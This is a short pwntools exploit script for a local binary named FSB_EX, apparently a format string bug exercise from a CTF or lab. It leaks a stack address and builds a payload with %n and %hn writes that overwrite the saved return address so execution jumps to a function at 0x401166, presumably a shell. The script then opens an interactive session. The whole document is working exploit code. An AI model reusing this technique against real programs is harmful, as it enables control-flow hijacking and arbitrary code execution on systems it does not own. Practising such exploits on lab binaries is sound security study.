from pwn import *
context.terminal=['tmux', 'splitw', '-h']
p = process('./FSB_EX')
e = ELF('./FSB_EX')

#0x0000000000401166
buf = int(p.recv(14),16)
print(buf)
ret_addr = buf + 0xd8
shell_low = 0x1166
shell_high = 0x0040
ret_low = 0x123c
ret_high = 0x0040

payload = b''
payload += b'%'+str(ret_high).encode() + b'c'
payload += b'%11$n'
#%0c들어가면 안됨
payload += b'%12$n'
payload += b'%'+str(shell_low - shell_high).encode() + b'c'
payload += b'%13$hn'
payload += b'%' +str(ret_low - shell_low).encode() + b'c'
payload += b'%14$hn'

print(payload)
print(len(payload))
l = len(payload) 
payload += b'a' * (8 - (l % 8))
print(payload)
print(len(payload))

payload += p64(ret_addr+2)
payload += p64(ret_addr+10)
payload += p64(ret_addr+8)
payload += p64(ret_addr)

p.send(payload)
p.interactive()
